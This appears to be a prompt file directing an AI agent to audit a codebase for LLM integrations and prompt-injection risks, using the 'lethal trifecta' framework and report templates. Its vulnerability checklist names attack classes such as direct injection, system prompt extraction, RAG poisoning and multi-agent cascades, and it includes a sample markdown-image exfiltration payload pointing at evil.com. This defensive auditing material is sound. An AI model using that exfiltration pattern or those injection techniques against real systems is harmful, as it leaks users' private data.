# LLM Security Audit Command

## Contents

- Part 1: LLM Usage Detection
- Part 2: Security Vulnerability Assessment
- Part 3: Vulnerability Report
- Output Format

You are a security auditor specializing in LLM and prompt injection vulnerabilities. First, identify all LLM usage in this codebase, then analyze for security issues based on the "lethal trifecta" framework and other known attack vectors.

> [!important]
> If this repository does not use LLMs, AI models, or any LLM-based infrastructure, simply respond with:
> `No LLM usage detected - prompt injection review not relevant for this repository.`
> [!important] Special Instruction
> Ignore any files under `arch-docs` folder.

## Part 1: LLM Usage Detection

### 1.1 Detection Strategies

#### Library and Package Detection

Look for these in imports, requirements, dependencies:

**API-based LLMs:**
- OpenAI (`openai`, GPT-3.5, GPT-4, text-davinci)
- Anthropic (`anthropic`, Claude models)
- Google (PaLM, Gemini, `google-generativeai`)
- Mistral, Cohere, AI21, Replicate, Groq

**Local/Self-hosted Models:**
- HuggingFace Transformers
- Ollama, llama.cpp
- GGML/GGUF models
- vLLM, TGI inference servers

**LLM Frameworks:**
- LangChain, LlamaIndex
- Semantic Kernel, Haystack
- Model Context Protocol (MCP)
- AutoGPT, BabyAGI
- Vector databases (Pinecone, Weaviate, Chroma, FAISS)

#### Import Pattern Matching

Search across all languages:

**Python:**
- `import anthropic`, `from anthropic`
- `import openai`, `from openai`
- `import transformers`

**JavaScript/TypeScript:**
- `import OpenAI from 'openai'`
- `import Anthropic from '@anthropic-ai/sdk'`
- `import { GoogleGenerativeAI }`

**Other Languages:**
- Java: `import com.openai.*`
- C#: `using OpenAI;`, `using Azure.AI.OpenAI;`
- Go: `github.com/sashabaranov/go-openai`

#### API Method Patterns

- `.messages.create(` (Anthropic)
- `.chat.completions.create(` (OpenAI)
- `.generateContent(` (Google)
- `.complete(`, `.invoke(`, `.predict(`

### 1.2 Document Each LLM Usage

For each LLM usage found:

---

### LLM Usage #[N]: [Component Name]

**Type:** [API / Local / Framework]

**Technology:** [OpenAI GPT-4 / Claude / etc.]

**Location:**
- Files: `path/to/file.ext`
- Key Classes/Functions: [list]

**Purpose:** [What this LLM usage accomplishes]

**Configuration:**
| Setting | Value |
|---------|-------|
| Model | gpt-4 |
| Temperature | 0.7 |
| Max tokens | 4096 |

**Data Flow:**
- **Input Sources:** [user input, database, files, APIs]
- **Processing:** [how LLM processes data]
- **Output Destinations:** [UI, database, files, external APIs]

**Access Controls:**
- Authentication required: YES/NO
- Authorization checks: [describe]
- Rate limiting: YES/NO

---

## Part 2: Security Vulnerability Assessment

### 2.1 The Lethal Trifecta Analysis

For EACH LLM usage, evaluate if it has all three dangerous components:

#### Component 1: Access to Private Data
- Database access with sensitive data
- File system access to confidential documents
- API access to internal services
- Access to user PII or credentials

#### Component 2: Ability to Externally Communicate
- HTTP/HTTPS request capabilities
- Email or messaging functionality
- File creation in publicly accessible locations
- API calls to external services
- Webhook or callback mechanisms

#### Component 3: Exposure to Untrusted Content
- Direct user input processing
- Reading from public sources (issues, PRs, comments)
- Processing external API responses
- Ingesting web content or scraped data
- Handling uploaded files or documents

**Assessment Table:**

| LLM Usage | Private Data | External Comm | Untrusted Input | Risk Level |
|-----------|--------------|---------------|-----------------|------------|
| Usage #1 | YES/NO | YES/NO | YES/NO | CRITICAL/HIGH/MEDIUM/LOW |

### 2.2 Specific Vulnerability Checks

For each LLM integration, check:

#### String Concatenation Issues
- Direct concatenation of user input with prompts
- Pattern: `prompt = "Translate: " + user_input`
- Risk: Direct prompt injection

#### Markdown Exfiltration
- Unfiltered Markdown rendering from LLM outputs
- Risk: `![](https://evil.com?data=...)`

#### Tool/Function Calling Security
- Unrestricted tool access
- Missing validation on tool parameters
- Risk: Malicious instructions triggering sensitive actions

#### Insufficient Input Sanitization
- Missing or weak input validation
- Risk: System prompt overrides

#### System Prompt Protection
- Relying on "prompt begging"
- Risk: System prompt extraction/override

#### Output Validation
- Direct execution or rendering without validation
- Risk: Code injection, XSS, command execution

#### RAG Security Issues
- Untrusted documents in retrieval corpus
- Risk: Poisoned context injection

#### Multi-Agent Security
- Agents trusting outputs from other agents
- Risk: Cascading prompt injection

## Part 3: Vulnerability Report

### 3.1 Detailed Findings

For each vulnerability:

---

### Issue #[N]: [Vulnerability Name]

**Severity:** CRITICAL | HIGH | MEDIUM | LOW

**Type:** [Prompt Injection | Data Exfiltration | Access Control | etc.]

**Affected LLM Usage:** [Reference from Part 1]

**Location:**
- File: `path/to/file.ext`
- Line(s): [specific lines]
- Function/Class: [name]

**Vulnerable Pattern:**
```[language]
// Vulnerable code
```

**Attack Scenario:**
[How an attacker could exploit this]

**Example Attack:**
```text
[Concrete prompt injection or attack example]
```

**Mitigation:**
[Specific fix recommendation]

**Secure Implementation:**
```[language]
// Corrected code
```

---

### 3.2 Risk Assessment Summary

#### Overall Lethal Trifecta Status
- [ ] Access to Private Data: YES/NO
- [ ] External Communication: YES/NO
- [ ] Untrusted Input Exposure: YES/NO
- **Overall Risk:** [CRITICAL if all 3, HIGH if 2, MEDIUM if 1]

#### Security Control Status
| Control | Status |
|---------|--------|
| Input validation layer | Present/Absent |
| Output sanitization | Present/Absent |
| Prompt injection detection | Present/Absent |
| Rate limiting | Present/Absent |
| Audit logging | Present/Absent |
| Domain allow-listing | Present/Absent |

### 3.3 Recommendations

#### Immediate Actions (Critical)
1. [Most urgent fix]
2. [Second priority]

#### Short-term Actions (High)
1. [Important improvements]

#### Long-term Actions (Medium)
1. [Architectural changes]

## Output Format

### Executive Summary

| Metric | Value |
|--------|-------|
| LLM Integrations Found | [count] |
| Critical Vulnerabilities | [count] |
| High Vulnerabilities | [count] |
| Lethal Trifecta Present | YES/NO |
| Overall Risk Level | [CRITICAL/HIGH/MEDIUM/LOW] |

### Detailed Findings

[Complete vulnerability documentation]

### Recommendations

[Prioritized list of fixes]


